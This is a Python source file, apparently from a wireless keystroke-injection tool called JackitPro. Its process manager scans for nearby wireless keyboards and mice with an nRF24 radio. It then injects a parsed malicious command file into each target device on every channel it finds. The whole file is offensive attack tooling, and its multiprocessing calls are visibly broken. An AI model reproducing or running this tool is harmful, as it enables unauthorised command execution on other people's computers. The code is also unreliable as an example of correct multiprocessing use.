import multiprocessing
from six import iteritems
from multiprocessing import Queue, Event
from JackitPro.Mapper.Parser import Parser


class NRF24ProcessManager:
    def __init__(self, nrf24):
        self.nrf24 = nrf24
        self.process = None
        self.result_queue = Queue()
        self.stop_event = Event()

    def clean_subprocess(self):
        self.process.join()
        self.process = None

    def subprocess_scan(self):
        self.process = multiprocessing.Process(
            target=self.nrf24.scan())
        self.process.start()

    def subprocess_attack(self, selected_file_content):
        self.process = multiprocessing.Process(
            target=self.activate_attack(selected_file_content, self.nrf24.devices))
        self.process.start()

    def activate_attack(self, selected_file_content, targets):
        if selected_file_content is not None:
            mal_command = Parser(selected_file_content).parse()

            for address, target in iteritems(targets):
                payload = target['payload']
                channels = target['channels']
                address = target['address']
                hid = target['device']

                self.nrf24.sniffer_mode(address)

                if hid:
                    for channel in channels:
                        self.nrf24.set_channel(channel)
                        self.nrf24.attack(hid(address, payload), mal_command)
